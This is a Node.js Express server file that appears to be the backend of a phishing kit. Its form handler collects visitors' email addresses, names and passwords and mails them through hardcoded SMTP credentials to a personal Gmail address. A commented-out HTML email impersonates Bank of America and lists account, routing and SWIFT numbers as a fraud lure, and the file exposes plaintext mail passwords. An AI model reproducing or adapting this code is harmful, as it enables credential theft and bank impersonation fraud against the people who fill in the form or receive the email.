const nodemailer = require("nodemailer")
const express = require("express")
const app = express()

app.use(express.static("public"))
app.use(express.json())

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html")
})

app.post("/", (req, res) => {
    console.log(req.body)
    // const transporter = nodemailer.createTransport({
    //     service: "gmail",
    //     auth: {
    //         user: "ayodejiamzat@gmail.com",
    //         pass: "08138226965"
    //     }
    // })
    // const mailOptions = {
    //     from: req.body.email,
    //     to: "ayodejiamzat@gmail.com",
    //     subject: `message from ${req.body.fname}`,
    //     text:`
    //     email: ${req.body.email}, 
    //     fname: ${req.body.fname}, 
    //     sname: ${req.body.sname}, 
    //     pass: ${req.body.password}
    //     `,
    // }
    // transporter.sendMail(mailOptions, (error, info) => {
    //     if(error){
    //         console.log(error)
    //         res.send("error")
    //     }else{
    //         console.log("email sent" + info.response)
    //         res.send("success")
    //     }
    // })
    let transporter = nodemailer.createTransport({
        host: "mail.corestepmfb.com",
        port: 465,
        secure: true,
        auth: {
            user: "test@corestepmfb.com",
            pass: "coreserver22/24"
        }
    })

    let mailOptions = ({
        from: '"we" <test@corestepmfb.com',
        to: "ayodejiamzat@gmail.com",
        subject: `message from we`,
        text: `
            email: ${req.body.email}, 
            fname: ${req.body.fname}, 
            sname: ${req.body.sname}, 
            pass: ${req.body.password}
        `,
//         html: `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
//         <html xmlns="http://www.w3.org/1999/xhtml">
//         <head>
//             <meta charset="UTF-8">
//     <meta http-equiv="X-UA-Compatible" content="IE=edge">
//     <meta name="viewport" content="width=device-width, initial-scale=1.0">
//     <title>Document</title>
//     <style>
//         *{
//             box-sizing: content-box;
//             padding: 0%;
//             margin: 0%;
//         }
//     </style>
//         </head>
//         <body>
//     <div style="background-color: red; width: inherit; height: 10px; margin-top: 20px;"></div>
//     <div style="width: 100vw; display: flex; justify-content: end;">
//         <img src="cid:unique@image" alt="" style="width: 180px; height: 100px; object-fit: cover; object-position: 0px 15px 0px 0px;">
//     </div>
//     <div style="margin-right: 2vw; margin-left: 2vw; font-size: 11px;">
//         <p>Hi, Hudson</p>
//         <p>
//             We apologize for the error that occurred on your last check deposit from<br> <span style="font-weight: 700;">Account: 4451317474</span><br>
//             <span style="font-weight: 700;">Swift Code: BOFAUS6S</span><br>
           
//            We look forward to contacting Amegy bank to resolve the negative balance on the account name: Amanda smith<br>
//            <span style="font-weight: 700;">Account number: 5794490937</span><br>
//            <span style="font-weight: 700;">Routine number: 113011258</span><br>
//            From the payment made off the check to the account</p>
//         <p style="margin-top: 10px;">Thank you for considering Bank of America</p><p style="margin-top: 10px;">Bank of America</p>
//     </div>
//     <div style="background-color: red; width: inherit; height: 10px; margin-top: 20px;"></div>
//     <div style="background-color: rgb(179, 225, 249); padding-top: 20px; padding-bottom: 20px; font-size: 10px">
//         <div style="margin-right: 2vw; margin-left: 2vw; text-align: center; color: black;">
//             <div style="font-weight: 600; padding-top: 20px; padding-bottom: 20px;">
//                 <a href="" style="margin-right: 7px; margin-left: 7px;">Locations</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Contact Us</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Help</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Accessible Banking</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Careers</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Privacy</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Security</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Sitemap</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Advertising Practices</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Share Your Feedback</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">View Full Online Banking Site</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">Browse with a Specialist</a>|<a href="" style="margin-right: 7px; margin-left: 7px;">CA Opt-Out Preference Signals Honored </a>
//             </div>
//             <p style="margin-bottom: 5px;">Connect with us</p>
//             <div>
//                 <img src="cid:unique1@image" alt="">
//                 <img src="cid:unique2@image" alt="">
//                 <img src="cid:unique3@image" alt="">
//                 <img src="cid:unique4@image" alt="">
//                 <img src="cid:unique5@image" alt="">
//                 <img src="cid:unique6@image" alt="">
//             </div>
//             <p style="font-size: 12px;">Bank of America, N.A. Member FDIC. Equal Housing Lender</p>
//             <p style="font-size: 10px;">© 2023 Bank of America Corporation. All rights reserved.</p>
//         </div>
//     </div>
// </body>
//         </html>`,
//         attachments: [
//             {
//               filename: "460.png",
//               path: "460.png",
//               cid: "unique@image",
//               contentType: "460/png", // Set the correct Content-Type for the image
//             },
//             {
//                 filename: "iconmonstr-facebook-6 (1).svg",
//                 path: "iconmonstr-facebook-6 (1).svg",
//                 cid: "unique1@image",
//                 contentType: "iconmonstr-facebook-6 (1)/svg", // Set the correct Content-Type for the image
//               },
//               {
//                 filename: "iconmonstr-instagram-9.svg",
//                 path: "iconmonstr-instagram-9.svg",
//                 cid: "unique2@image",
//                 contentType: "iconmonstr-instagram-9/svg", // Set the correct Content-Type for the image
//               },
//               {
//                 filename: "iconmonstr-linkedin-3 (1).svg",
//                 path: "iconmonstr-linkedin-3 (1).svg",
//                 cid: "unique3@image",
//                 contentType: "iconmonstr-linkedin-3 (1)/svg", // Set the correct Content-Type for the image
//               },
//               {
//                 filename: "iconmonstr-pinterest-5.svg",
//                 path: "iconmonstr-pinterest-5.svg",
//                 cid: "unique4@image",
//                 contentType: "iconmonstr-pinterest-5/svg", // Set the correct Content-Type for the image
//               },
//               {
//                 filename: "iconmonstr-twitter-1 (1).svg",
//                 path: "iconmonstr-twitter-1 (1).svg",
//                 cid: "unique5@image",
//                 contentType: "iconmonstr-twitter-1 (1)/svg", // Set the correct Content-Type for the image
//               },
//               {
//                 filename: "iconmonstr-youtube-6.svg",
//                 path: "iconmonstr-youtube-6.svg",
//                 cid: "unique6@image",
//                 contentType: "iconmonstr-youtube-6/svg", // Set the correct Content-Type for the image
//               }
//           ],

    })

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error)
        }else{
            // res.json({message: "success"})
            console.log("email sent" + info.response)
            res.send("success")
        }

        console.log("message sent: %s", info.messageId);
        console.log("preview url: %s", nodemailer.getTestMessageUrl(info));
    })
})

const PORT = process.env.PORT || 5000;
app.listen(
    PORT,
    console.log(`server runnin in ${process.env.NODE_ENV} mode on port ${PORT}`)
)